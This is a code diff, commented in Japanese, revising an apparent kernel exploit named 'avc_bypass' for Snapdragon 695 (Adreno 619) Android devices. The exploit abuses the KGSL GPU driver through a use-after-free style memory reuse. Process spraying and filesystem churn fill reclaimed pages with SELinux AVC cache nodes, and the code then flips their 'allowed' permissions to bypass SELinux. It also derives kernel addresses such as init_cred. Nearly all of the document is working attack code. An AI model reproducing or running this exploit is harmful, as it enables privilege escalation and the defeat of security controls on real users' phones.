@@ -76,18 +76,18 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
+#define OVERLAP_SIZE 0x1000
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
 #define AVC_NODE_STRIDE  72
 #define SPRAY_PIDS 2000
+#define OVERLAP_COUNT 100
 
 #define VMLINUX_TEXT 0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED_OFFSET 0x26fa738
 
 /* ============ グローバル変数 ============ */
 static int kgsl_fd = -1;
-static void *uaf_map = NULL;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -100,6 +100,14 @@ static int gpuobj_alloc(uint64_t size, uint64_t flags) {
 static void gpuobj_free(unsigned int id) {
     struct kgsl_gpuobj_free f = { .id = id };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
+}
+static void *gpuobj_mmap(size_t size, unsigned int id) {
+    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
+    if (p == MAP_FAILED) die("gpuobj_mmap");
+    return p;
+}
+static void gpuobj_munmap(void *addr, size_t size) {
+    if (munmap(addr, size) < 0) die("gpuobj_munmap");
 }
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     struct kgsl_gpuobj_info inf = { .id = id };
@@ -199,21 +207,17 @@ static void churn_build(void) {
     printf("[CHURN] %d paths\n", churn_npaths);
 }
 
-/* 強力なチャーン：ランダムなパスに対して open/stat/access を繰り返す */
+/* 強力なチャーン */
 static void churn_round_intensive(void) {
     churn_build();
-    // 既存のパスを開く
     for (int i = 0; i < churn_npaths; i++) {
         int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
         if (fd >= 0) close(fd);
-        // stat も呼ぶ
         struct stat st;
         stat(churn_paths[i], &st);
-        // access も呼ぶ
         access(churn_paths[i], R_OK);
     }
 
-    // 存在しないパスも大量に試す（AVC チェックが必ず発生）
     char fake_path[256];
     for (int i = 0; i < 10000; i++) {
         snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
@@ -224,7 +228,6 @@ static void churn_round_intensive(void) {
         if (fd >= 0) close(fd);
     }
 
-    // ソケット、IPC なども使用
     int s = socket(AF_INET, SOCK_STREAM, 0);
     if (s >= 0) { close(s); }
     s = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -240,7 +243,6 @@ static void churn_round_intensive(void) {
     shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
     mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 
-    // enforce の書き込みも繰り返す（AVC チェックが発生）
     for (int i = 0; i < 100; i++) {
         int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
         if (fd >= 0) { write(fd, "1", 1); close(fd); }
@@ -248,7 +250,7 @@ static void churn_round_intensive(void) {
     }
 }
 
-/* ============ 子プロセススプレー（各子でチャーンを実行させる） ============ */
+/* ============ 子プロセススプレー（各子でチャーンを実行） ============ */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -258,12 +260,10 @@ static void spawn_spray_with_churn(void) {
         pid_t p = fork();
         if (p == 0) {
             prctl(PR_SET_NAME, "TASKUAF!!");
-            // 各子プロセスで多数のファイルアクセスを行い、AVC ノードを生成
             for (int j = 0; j < 50; j++) {
                 churn_round_intensive();
                 usleep(10000);
             }
-            // その後、無限ループで待機
             for (;;) usleep(200000);
         }
         if (p > 0) spray_pids[n_spray++] = p;
@@ -318,8 +318,8 @@ static int scan_and_flip_cpu(void *start, size_t size, int verbose) {
 /* ============ メイン ============ */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - CPU mapping UAF (強化版)\n");
-    printf("[*] Strategy: UAF + intensive churn + CPU scan + flip allowed\n");
+    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 正しいCPUマッピング版\n");
+    printf("[*] 手順: 巨大オブジェクト確保→mmap→munmap→解放→スプレー→チャーン→小オブジェクト確保→mmap→スキャン\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -336,62 +336,99 @@ int main(int argc, char **argv) {
     uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
     printf("[*] init_cred = 0x%lx (reference only)\n", init_cred_addr);
 
-    // ---- Phase 1: CPU マップ付き巨大オブジェクト確保 + mmap ----
-    printf("[*] Phase 1: Allocate large GPU object with CPU map and mmap\n");
+    // ---- Phase 1: 巨大オブジェクト確保 + mmap + munmap + 解放 ----
+    printf("[*] Phase 1: Allocate large object, mmap, munmap, free\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    uint64_t uaf_gpuaddr = 0;
-    gpuobj_info(uaf_id, &uaf_gpuaddr);
-    printf("[+] Large object id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
-
-    // mmap してマッピングを保持
-    uaf_map = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-                   MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_map == MAP_FAILED) die("mmap UAF");
-    printf("[+] mmap at %p\n", uaf_map);
-
-    // ---- Phase 2: 巨大オブジェクト解放（UAF 状態になる） ----
-    printf("[*] Phase 2: Free large object (UAF created)\n");
-    gpuobj_free(uaf_id);
+    int large_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    printf("[+] Large object id=%d\n", large_id);
+    void *large_map = gpuobj_mmap(UAF_SIZE, large_id);
+    printf("[+] mmap at %p\n", large_map);
+    gpuobj_munmap(large_map, UAF_SIZE);
+    printf("[+] munmap done\n");
+    gpuobj_free(large_id);
     printf("[+] Freed\n");
 
-    // ---- Phase 3: メモリ回収 ----
-    printf("[*] Phase 3: Reclaim memory\n");
+    // ---- Phase 2: メモリ回収 ----
+    printf("[*] Phase 2: Reclaim memory\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
     rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ---- Phase 4: task_struct スプレー（各子でチャーンを実行） ----
+    // ---- Phase 3: 子プロセススプレー（task_struct でページを占有） ----
     spawn_spray_with_churn();
 
-    // ---- Phase 5: 子プロセスを kill してページを解放（avc_node を含むページが残る） ----
+    // ---- Phase 4: 子プロセスを kill（ページを解放） ----
     kill_spray_children();
     usleep(100000);
 
-    // ---- Phase 6: さらにチャーン（avc_node をより多く割り当てる） ----
-    printf("[*] Phase 6: Intensive churn to allocate avc_nodes\n");
+    // ---- Phase 5: チャーン（AVC ノードを割り当て） ----
+    printf("[*] Phase 5: Intensive churn to allocate avc_nodes\n");
     for (int c = 0; c < 5; c++) {
         churn_round_intensive();
         printf("[CHURN] round %d done\n", c+1);
     }
 
-    // ---- Phase 7: CPU マッピングをスキャンして AVC ノードを探し、allowed をフリップ ----
-    printf("[*] Phase 7: Scan UAF region (CPU mapping) for avc_nodes and flip allowed\n");
-    int flips = scan_and_flip_cpu(uaf_map, UAF_SIZE, 1);
-    printf("[*] Total flips: %d\n", flips);
+    // ---- Phase 6: 小さなオブジェクトを複数確保し、mmap（同じ物理ページを再利用） ----
+    printf("[*] Phase 6: Allocate small objects to reuse pages, and mmap them\n");
+    void *small_maps[OVERLAP_COUNT];
+    int small_ids[OVERLAP_COUNT];
+    int success = 0;
 
-    // キャッシュの一貫性のため、CPU キャッシュをフラッシュ（必要なら）
-    __sync_synchronize();
+    for (int i = 0; i < OVERLAP_COUNT; i++) {
+        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+        if (id < 0) continue;
+        void *map = gpuobj_mmap(OVERLAP_SIZE, id);
+        if (map == MAP_FAILED) { gpuobj_free(id); continue; }
+        small_ids[success] = id;
+        small_maps[success] = map;
+        success++;
+        if (success >= OVERLAP_COUNT) break;
+    }
+    printf("[+] Successfully mapped %d small objects\n", success);
+    if (success == 0) {
+        printf("[-] Failed to map any small objects\n");
+        close(kgsl_fd);
+        return 1;
+    }
 
-    // ---- Phase 8: フリップが0だった場合、再度チャーンとスキャンを繰り返す ----
-    if (flips == 0) {
+    // ---- Phase 7: 各マッピングをスキャンして avc_node をフリップ ----
+    printf("[*] Phase 7: Scan each mapping for avc_nodes and flip allowed\n");
+    int total_flips = 0;
+    for (int i = 0; i < success; i++) {
+        int flips = scan_and_flip_cpu(small_maps[i], OVERLAP_SIZE, 1);
+        total_flips += flips;
+    }
+    printf("[*] Total flips: %d\n", total_flips);
+
+    // ---- Phase 8: フリップが0の場合、再度チャーンとスキャンを繰り返す ----
+    if (total_flips == 0) {
         printf("[!] No AVC nodes found. Retrying with more churn...\n");
-        for (int retry = 0; retry < 3 && flips == 0; retry++) {
+        for (int retry = 0; retry < 3 && total_flips == 0; retry++) {
             churn_round_intensive();
-            flips = scan_and_flip_cpu(uaf_map, UAF_SIZE, 1);
-            printf("[*] Retry %d: flips=%d\n", retry+1, flips);
+            // 新しいオブジェクトを確保（古いのはmunmapしてfree）
+            for (int i = 0; i < success; i++) {
+                gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
+                gpuobj_free(small_ids[i]);
+            }
+            // 再度確保
+            success = 0;
+            for (int i = 0; i < OVERLAP_COUNT; i++) {
+                int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+                if (id < 0) continue;
+                void *map = gpuobj_mmap(OVERLAP_SIZE, id);
+                if (map == MAP_FAILED) { gpuobj_free(id); continue; }
+                small_ids[success] = id;
+                small_maps[success] = map;
+                success++;
+                if (success >= OVERLAP_COUNT) break;
+            }
+            total_flips = 0;
+            for (int i = 0; i < success; i++) {
+                total_flips += scan_and_flip_cpu(small_maps[i], OVERLAP_SIZE, 1);
+            }
+            printf("[*] Retry %d: flips=%d\n", retry+1, total_flips);
         }
     }
 
@@ -419,7 +456,10 @@ int main(int argc, char **argv) {
     }
 
     // 後片付け
-    munmap(uaf_map, UAF_SIZE);
+    for (int i = 0; i < success; i++) {
+        gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
+        gpuobj_free(small_ids[i]);
+    }
     close(kgsl_fd);
     return ok ? 0 : 1;
 }
